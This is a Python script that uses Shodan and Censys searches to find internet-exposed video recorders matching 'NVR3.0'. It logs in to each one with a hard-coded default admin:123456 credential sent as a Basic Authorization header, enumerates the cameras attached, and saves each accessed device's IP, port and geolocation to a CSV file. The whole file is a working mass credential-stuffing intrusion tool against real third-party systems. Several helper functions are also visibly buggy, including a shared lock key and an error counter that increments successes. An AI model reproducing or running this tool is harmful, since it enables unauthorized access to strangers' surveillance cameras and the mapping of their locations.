from shodan import Shodan
from censys.search import CensysHosts
import config
import requests
import threading
import math


request_count = 0
success = 0
failed = 0
errors = 0
threads = 0
mutex_list = {}

with open('output.csv', 'w') as f:
    f.writelines("ip,port,status_code,camera count,source,city,country,country_code,longitude,latitude\n")


def add_mutex(name):
    if not name in mutex_list:
        mutex_list["name"] = threading.Lock()

    def decorator(function):
        def wrapper(*args, **kwargs):
            mutex_list["name"].acquire()
            result = function(*args, **kwargs)
            mutex_list["name"].release()
            return result
        return wrapper
    return decorator


@add_mutex("threads")
def change_thread_count(change):
    global threads
    threads = threads + change

@add_mutex("print_single")
def print_single(server):
    print(f"[ \033[92m{success} \033[97m| \033[33m{failed} \033[97m| \033[91m{errors} \033[97m] http://\033[96m{server}\033[97m/")

@add_mutex("success")
def add_success():
    global success
    success += 1

@add_mutex("failed")
def add_failed():
    global failed
    failed += 1

@add_mutex("error")
def add_error():
    global success
    success += 1




save_mutex = threading.Lock()
def save(server, code, count, source, city, country, country_code, long, lat):
    save_mutex.acquire()
    split = server.split(":")
    with open('output.csv', 'a') as f:
        f.writelines(f"{split[0]},{split[1]},{code},{count},{source},{city},{country},{country_code},{long},{lat}\n")

    save_mutex.release()
    exit()

def send_login_request(server, source, city, country, country_code, long, lat):
    global success, failed, request_count
    try:
        r = requests.get(f"http://{server}/Media/UserGroup/login?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)

        if r.status_code == 200:
            add_success()

            count = "N/A"
            try:
                r = requests.get(f"http://{server}/Media/Device/getDevice?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)
                if r.status_code == 200:
                    json = r.json()
                    count = len(json["DeviceConfig"]["Devices"]["Device"])
            except:
                pass

            print_single(server)
            save(server, r.status_code, count, source, city, country, country_code, long, lat)
        else:
            add_failed()

    except Exception:
        add_error()

    finally:
        change_thread_count(-1)



def start_thread(param, source, city, country, country_code, long, lat):
    while threads >= config.MAX_THREADS:
        pass


    change_thread_count(1)
    threading.Thread(target=send_login_request, args=(param,source,city,country,country_code,long,lat)).start()

print("\033[92msuccess\t\033[33mfailure\t\033[91merror")
if config.SHODAN:
    api = Shodan(config.SHODAN_API)
    search_term = 'http.html:NVR3.0'
   
    count = api.count(search_term)['total'] 
    for page in range(math.ceil(count/100)):
        query = api.search(query=search_term, page=page+1)
        for server in query['matches']:
            param = f"{server['ip_str']}:{server['port']}"
            location = server["location"]
            start_thread(param, "SHODAN", location["city"], location["country_name"], location["country_code"], location["longitude"], location["latitude"])

if config.CENSYS:
    h = CensysHosts()
    query = h.search("NVR3.0", per_page=50, pages=5)

    for page in query:
        for server in page:
            for service in server['services']:
                if service['service_name'] != "HTTP":
                    continue


                location = server["location"]

                city = location["city"] if 'city' in location else 'N/A'
                start_thread(f"{server['ip']}:{service['port']}", "CENSYS", city, location["country"], location["country_code"], location["coordinates"]["longitude"], location["coordinates"]["latitude"])
                
